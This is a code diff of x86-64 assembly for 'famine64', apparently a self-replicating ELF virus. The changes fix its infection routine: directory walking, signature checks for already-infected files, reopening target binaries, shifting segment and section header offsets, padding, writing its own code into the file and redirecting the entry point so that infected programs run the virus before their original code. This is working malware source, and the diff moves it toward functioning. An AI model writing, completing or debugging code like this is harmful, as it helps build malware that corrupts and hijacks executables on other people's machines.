@@ -20,8 +20,8 @@
 famine64_func:
 	push	rax
 	push	rdi
+	push	rbp
 	sub		rsp, 0x10
-	;jmp famine64_end
 
 	mov		QWORD[rsp], 0
 dir_loop:
@@ -40,11 +40,8 @@ dir_loop:
 ;;                                                                            ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 find_files:
-	push	rax
 	push	rbx
 	push	rdx
-	push	rdi
-	push	rsi
 	sub		rsp, 1040		; char *dirpath, int fd   , int ret   , char b[1024]
 							; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]
 
@@ -105,11 +102,8 @@ loop_end:
 	syscall
 find_files_end:
 	add		rsp, 1040
-	pop		rsi
-	pop		rdi
 	pop		rdx
 	pop		rbx
-	pop		rax
 	ret
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -118,8 +112,8 @@ find_files_end:
 ;;                                                                            ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 get_dat_elf:
-	push	rbp
 	push	rbx
+	push	rbp
 	sub		rsp, 1024				; char path[1024]
 									; [rsp]
 
@@ -276,8 +270,8 @@ munmap_file:
 	syscall
 get_dat_elf_end:
 	add		rsp, 1040
-	pop		rbx
 	pop		rbp
+	pop		rbx
 	ret
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -459,9 +453,9 @@ find_entry_segment:
 
 find_entry_end:
 	cmp		QWORD [rsp + 8], 0			; iprogram == NULL ?
-	je		infect_end
+	je		infect_file_end
 	cmp		QWORD [rsp + 24], 0			; isection == NULL ?
-	je		infect_end
+	je		infect_file_end
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 2. Check if the file is already infected                              ;;
@@ -473,7 +467,7 @@ check_signature:
 	sub		rax, 8						; - sizeof(signature)
 	mov		rax, QWORD [rax]
 	cmp		rax, QWORD [rel famine64_signature]
-	je		infect_end
+	je		infect_file_end
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; char *path, size_t size, char *data
@@ -489,11 +483,11 @@ check_signature:
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 reopen_file:
 	mov		rsi, 0x281						; O_WRONLY | O_TRUNC | O_EXCL
-	;lea		rdi, [rsp + 40]
+	;lea		rdi, [rsp + 40]				; char *path
 	mov		rax, SYS_OPEN
 	syscall
 	cmp		eax, 0
-	jl		infect_end
+	jl		infect_file_end
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int fd    , Elf64_Addr off, Elf64_Addr old_entry, Elf64_Addr padding  ;;
@@ -505,6 +499,7 @@ reopen_file:
 	mov		rcx, QWORD [rax + 8]			; iprogram->p_offset
 	add		rcx, QWORD [rax + 32]			; ... + iprogram->p_filesz
 	mov		QWORD [rsp + 68], rcx			; Injection Offset !!!
+
 	mov		rax, QWORD [rsp + 56]			; void *data
 	mov		rax, QWORD [rax + 24]			; data->e_entry
 	sub		rcx, rax						; off - ->e_entry
@@ -517,7 +512,7 @@ reopen_file:
 	mov		rcx, QWORD [rsp + 68]			; Elf64_Addr off
 	add		rcx, 8							; ... + sizeof(famine64_signature)
 	mov		rax, QWORD [rsp + 56]			; void *data
-	mov		QWORD [rax + 24], rcx
+	mov		QWORD [rax + 24], rcx			; data->e_entry = off + famine64_signature size
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 5. Check if we have room to write our code                            ;;
@@ -529,7 +524,7 @@ reopen_file:
 	mov		rdx, QWORD [rsp + 8]			; iprogram
 	mov		rbx, 0
 find_next_segment:
-	cmp		bx, WORD [rax + 56]
+	cmp		bx, WORD [rax + 56]				; i < data->e_phnum ?
 	jae		find_next_segment_end
 	xor		rcx, rcx
 	mov		cx, WORD [rax + 54]				; data->e_phentsize
@@ -551,7 +546,7 @@ found_next_segment:
 	jmp		find_next_segment
 find_next_segment_end:
 	cmp		QWORD [rsp + 32], 0				; next_ptload == NULL ?
-	je		infect_end			; Need a function to handle this case
+	je		infect_file_end; Need a function to handle this case !!!!!
 	mov		QWORD [rsp + 84], 0				; padding = 0
 	mov		rax, QWORD [rdx + 8]			; iprogram->p_offset
 	add		rax, QWORD [rdx + 32]			; ... + iprogram->p_filesz
@@ -568,10 +563,14 @@ padding_size:
 	cmp		QWORD [rsp + 84], rax			; padding < psize
 	jl		padding_size
 	mov		rax, QWORD [rsp + 84]
-	;; Change Section Header Table offset
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; Change Section Header Table offset                                    ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov		rcx, QWORD [rsp + 56]			; void *data
 	add		QWORD [rcx + 40], rax			; data->e_shoff += padding
-	;; Change Programs' offset
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; Change Programs' offset                                               ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; rax = padding, rcx = void *data, rdx = void *iprogram
 	mov		rbx, 0
 phdr_padding:
@@ -588,7 +587,7 @@ phdr_padding:
 	jl		phdr_padding
 	add		r9, rax
 	cmp		r9, QWORD [r8 + 16]				; iprogram->p_offset + iprogram->p_filesz + padding > program[i].p_vaddr ?
-	ja		infect_end
+	ja		infect_file_end
 	add		QWORD [r8 + 8], rax
 	jmp		phdr_padding
 phdr_padding_end:
@@ -650,16 +649,16 @@ infect_write:
 	;; 8. Add padding if needed                                              ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov		rax, QWORD [rel famine64_size]
-	add		rax, 8
-	cmp		QWORD [rsp + 84], rax			; padding > psize ?
+	add		rax, 8							; add famine64_signature size
+	cmp		QWORD [rsp + 84], rax			; padding == psize ?
 	je		off_add
 add_padding:
 	mov		rdx, 1
-	lea		rsi, [rel zero]
+	lea		rsi, [rel zero]					; '\0'
 	mov		edi, DWORD [rsp + 64]			; int fd
 	mov		rax, SYS_WRITE
 	syscall
-	sub		QWORD [rsp + 84], 1
+	sub		QWORD [rsp + 84], 1				; padding--
 	mov		rax, QWORD [rel famine64_size]
 	add		rax, 8
 	cmp		QWORD [rsp + 84], rax			; padding > psize ?
@@ -672,34 +671,33 @@ infect_write_end:
 	sub		rdx, QWORD [rsp + 68]			; size - off
 	sub		rdx, 1							; size - off -1
 	mov		rsi, QWORD [rsp + 56]			; void *data
-	sub		rsi, QWORD [rsp + 68]			; data - off
+	add		rsi, QWORD [rsp + 68]			; data + off
 	mov		edi, DWORD [rsp + 64]			; int fd
 	mov		rax, SYS_WRITE
 	syscall
 	mov		edi, DWORD [rsp + 64]			; int fd
 	mov		rax, SYS_CLOSE
 	syscall
-
-infect_end:
+infect_file_end:
 	add		rsp, 96
 	pop		rbx
-	pop		rsp
+	pop		rbp
 	ret
 	
 famine64_end:
 	cmp		QWORD [rel jump_offset], 0x0	; No jump offset if the executable is the original binary
 	je		no_jump
 	lea		rax, [rel famine64_func]
-	add		QWORD [rel jump_offset], rax
+	add		rax, QWORD [rel jump_offset]
+	sub		rax, 8
+	mov		QWORD [rsp + 0x20], rax
+	jmp		do_ret
 no_jump:
+	add		rsp, 0x8
+do_ret:
 	add		rsp, 0x10
 	pop		rdi
 	pop		rax
-
-	cmp		QWORD [rel jump_offset], 0x0	; No jump address if the executable is the first
-	je		do_ret
-	push	QWORD [rel jump_offset]
-do_ret:
 	ret
 
 data:
